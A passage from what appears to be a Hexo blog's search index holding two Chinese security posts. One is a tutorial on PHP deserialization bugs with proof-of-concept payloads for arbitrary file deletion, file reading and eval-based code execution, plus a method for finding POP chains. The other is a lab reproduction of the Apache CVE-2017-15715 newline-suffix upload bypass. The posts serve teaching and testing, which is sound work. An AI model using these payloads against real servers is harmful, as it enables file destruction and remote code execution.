class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="E:/机密文件/hexo/blog/source/_posts/php反序列化漏洞总结/pu7ob.png" alt="6">然后将这个序列化的字符重新导入到poc代码中，反序列化之后，就会生成一个shell.php,并且内容为<code>&lt;?php phpinfo(); ?&gt;</code></p><p><img src="4g1pi.png" alt="7"></p><p>存在漏洞的思路：一个类用于临时将日志储存进某个文件，当__destruct被调用时，日志文件将会被删除，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class logfile</span><br><span class="line">&#123;</span><br><span class="line">    //log文件名</span><br><span class="line">    public $filename = &#x27;error.log&#x27;;</span><br><span class="line">    //一些用于储存日志的代码</span><br><span class="line">    public function logdata($text)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;log data:&#x27;.$text.&#x27;&lt;br /&gt;&#x27;;</span><br><span class="line">        file_put_contents($this-&gt;filename,$text,FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">    //destrcuctor 删除日志文件</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;__destruct deletes &#x27;.$this-&gt;filename.&#x27;file.&lt;br /&gt;&#x27;;</span><br><span class="line">        unlink(dirname(__FILE__).&#x27;/&#x27;.$this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">//test5.php</span><br></pre></td></tr></table></figure><p>调用这个类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &#x27;test5.php&#x27;</span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    //类数据</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $name = &#x27;&#x27;;</span><br><span class="line">    //输出数据</span><br><span class="line">    public function printdata()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;User &#x27;.$this-&gt;name.&#x27; is&#x27;.$this-&gt;age.&#x27; years old.&lt;br /&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//重建数据</span><br><span class="line">$usr = unserialize($_GET[&#x27;usr_serialized&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">//一个示例代码</span><br></pre></td></tr></table></figure><p>GET[‘usr_serialized’]);$_GET[‘usr_serialized’]是可控的，那么我们就可以构造输入删除任意文件<br>构造输入删除目录下的index.php文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;test5.php&#x27;;</span><br><span class="line">$object = new logfile();</span><br><span class="line">$object-&gt;filename = &#x27;index.php&#x27;;</span><br><span class="line"></span><br><span class="line">echo serialize($object).&#x27;&lt;br /&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">//test7.php</span><br></pre></td></tr></table></figure><p>接下来先进入index.php：</p><p>接下来尝试使用test7.php删除了index.php，进入test7.php:<br>现在在目录里已经没有了index.php:</p><p>我们再次访问一下test7.php试一试：</p><p>index.php已经没有了。<br>这是一个简单的示例。</p><p>常见的注入点<br>上一部分展示了由于输入可控造成的__destruct函数删除任意文件，其实问题也可能存在于__wakeup、__sleep、__toString等其他magic函数，一切都取决于程序逻辑。比如，某用户类定义了一个__toString，为了让应用程序能够将类作为一个字符串输出（echo $object），而且其他类也可能定义了一个类允许__toString读取某个文件。<br>现在开始这个小实验，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &#x27;test9.php&#x27;;</span><br><span class="line">$fileobj = new fileclass();</span><br><span class="line">$fileobj-&gt;filename = &#x27;hello.txt&#x27;;</span><br><span class="line"></span><br><span class="line">echo serialize($fileobj);</span><br><span class="line">?&gt;</span><br><span class="line">//test8.php</span><br></pre></td></tr></table></figure><p>我们先访问test8.php，结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class fileclass</span><br><span class="line">&#123;</span><br><span class="line">    //文件名</span><br><span class="line">    public $filename = &#x27;error.log&#x27;;</span><br><span class="line">    //当对象被作为一个字符串会读取这个文件</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return file_get_contents($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class user</span><br><span class="line">&#123;</span><br><span class="line">    //class data</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $name = &#x27;&#x27;;</span><br><span class="line">    //允许对象作为一个字符串输出上面的data</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return &#x27;user &#x27;.$this-&gt;name.&#x27; is &#x27;.$this-&gt;age.&#x27; years old.&lt;br /&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//用户可控</span><br><span class="line">$obj = unserialize($_GET[&#x27;usr_serialized&#x27;]);</span><br><span class="line">//输出__toString</span><br><span class="line">echo $obj</span><br><span class="line">?&gt;</span><br><span class="line">//test9.php</span><br></pre></td></tr></table></figure><p>接下来我们出发反序列化漏洞，获取hello.txt的内容：<br>构造url：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/test9.php?usr_serialized=O:9:%22fileclass%22:1:&#123;s:8:%22filename%22;s:9:%22hello.txt%22;&#125;</span><br></pre></td></tr></table></figure><p>访问：<br>可以看到hello.txt的内容：</p><h2 id="2-利用普通成员方法"><a href="#2-利用普通成员方法" class="headerlink" title="2.利用普通成员方法"></a>2.利用普通成员方法</h2><p>在反序列化的时候，当漏洞/危险代码存在类的普通方法中，就不能指望通过“自动调用”来达到目的了。这时的利用方法如下，寻找相同的函数名，把敏感函数和类联系在一起。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class l1nk3r &#123;</span><br><span class="line">    var $test;</span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;test = new CodeMonster();</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        $this-&gt;test-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class CodeMonster &#123;</span><br><span class="line">    function action() &#123;</span><br><span class="line">        echo &quot;CodeMonster&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class CodeMonster1 &#123;</span><br><span class="line">    var $test2;</span><br><span class="line">    function action() &#123;</span><br><span class="line">        eval($this-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$class6 = new l1nk3r();</span><br><span class="line">unserialize($_GET[&#x27;test&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>从代码上来看，来通过new 实例化一个新的l1nk3r对象后，调用<code>__construct()</code>，其中该函数又new了一个新的CodeMonster对象；这个对象的功能是定义了action()函数，并且打印CodeMonster。然后结束的时候调用<code>__destruct()</code>,在<code>__destruct()</code>会调用action()，因此页面会输出CodeMonster。</p><p><img src="3igq4.png" alt="8"></p><p>但是在代码中，我们看得到codermaster1对象中有一个eval()函数，这可是危险函数啊，那有什么方法，通过发序列化触发它呢，当然有了。刚刚在l1nk3r对象中，new的是CodeMonster，如果new的是CodeMonster1，那么自然就会进入CodeMonster1中，然后eval()函数中的<code>$test2</code>可控制，那么自然就可以实现远程代码执行了。</p><p>Poc：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class l1nk3r &#123;</span><br><span class="line">    var $test;</span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;test = new CodeMonster1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class CodeMonster1 &#123;</span><br><span class="line">    var $test2=&#x27;phpinfo();&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class6 = new l1nk3r();</span><br><span class="line">print_r(serialize($class6));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>生成的序列化字符串：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;l1nk3r&quot;:1:&#123;s:4:&quot;test&quot;;O:11:&quot;CodeMonster1&quot;:1:&#123;s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="2o48f.png" alt="9"></p><h1 id="查找反序列化漏洞及构造exploit的方法"><a href="#查找反序列化漏洞及构造exploit的方法" class="headerlink" title="查找反序列化漏洞及构造exploit的方法"></a>查找反序列化漏洞及构造exploit的方法</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>PHP的 unserialize() 函数只能反序列化在当前程序上下文中已经被定义过的类.在传统的PHP中你需要通过使用一大串的include() 或者 require()来包含所需的类定义文件。于是后来出现了 autoloading 技术,他可以自动导入需要使用的类,再也不需要程序员不断地复制粘贴 那些include代码了。这种技术同时也方便了我们的漏洞利用.因为在我们找到一个反序列化点的时候我们所能使用的类就多了,那么实现漏洞利用的可能性也就更加高。</p><p>还有一个东西要提一下,那就是Composer,这是一个php的包管理工具,同时他还能自动导入所以依赖库中定义的类。这样一来 unserialize() 函数也就能使用所有依赖库中的类了,攻击面又增大不少。</p><p>1.Composer配置的依赖库存储在vendor目录下</p><p>2.如果要使用Composer的自动类加载机制,只需要在php文件的开头加上</p><p><code>require __DIR__ . &#39;/vendor/autoload.php&#39;</code>;</p><h2 id="漏洞发现技巧"><a href="#漏洞发现技巧" class="headerlink" title="漏洞发现技巧"></a>漏洞发现技巧</h2><p>默认情况下 Composer 会从 Packagist下载包,那么我们可以通过审计这些包来找到可利用的 POP链。</p><p>找PHP链的基本思路.</p><p>1.在各大流行的包中搜索 <code>__wakeup()</code> 和 <code>__destruct()</code> 函数.</p><p>2.追踪调用过程</p><p>3.手工构造 并验证 POP 链</p><p>4.开发一个应用使用该库和自动加载机制,来测试exploit.</p><h2 id="构造exploit的思路"><a href="#构造exploit的思路" class="headerlink" title="构造exploit的思路"></a>构造exploit的思路</h2><p>1.寻找可能存在漏洞的应用</p><p>2.在他所使用的库中寻找 POP gadgets</p><p>3.在虚拟机中安装这些库,将找到的POP链对象序列化,在反序列化测试payload</p><p>4.将序列化之后的payload发送到有漏洞web应用中进行测试.</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞总结 </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-15715漏洞复现</title>
      <link href="/2021/07/25/CVE-2017-15715%E6%BC%8F%E6%B4%9E%E6%B5%AE%E7%8E%B0/"/>
      <url>/2021/07/25/CVE-2017-15715%E6%BC%8F%E6%B4%9E%E6%B5%AE%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p><strong>Apache换行解析漏洞</strong></p><p><strong>影响版本</strong>：Apache 2.4.0~2.4.29</p><p><strong>影响说明</strong>：绕过服务器策略，上传webshell</p><p><strong>环境说明</strong>：PHP5.5 、 Apache2.4.10</p><span id="more"></span><p>漏洞复现利用如下</p><p>打开环境即是个文件上传点</p><p><img src="image-20210723090110218.jpg" alt="image-20210723090110218"></p><p>先上潮汐看</p><p><img src="image-20210723090159097.jpg" alt="image-20210723090159097"></p><p>Apache</p><p>百度搜一波</p><p>我们利用CVE-2017-15715(Apache换行解析漏洞)</p><blockquote><p>此漏洞的出现是由于 apache 在修复第一个后缀名解析漏洞时，用正则来匹配后缀。在解析 php 时 xxx.php\x0A 将被按照php 后缀进行解析，导致绕过一些服务器的安全策略。</p></blockquote><p>于是</p><p>上传一个php文件。注意，只能是<code>\x0A</code>，不能是<code>\x0D\x0A</code>，所以我们用hex功能在1.php后面添加一个<code>\x0A</code></p><p><img src="image-20210723090926609.jpg" alt="image-20210723090926609"></p><p>上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>成功</p><p>然后访问<code>/1.php%0A</code>，即可发现已经成功getshell</p><p><img src="image-20210723092640423.jpg" alt="image-20210723092640423"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
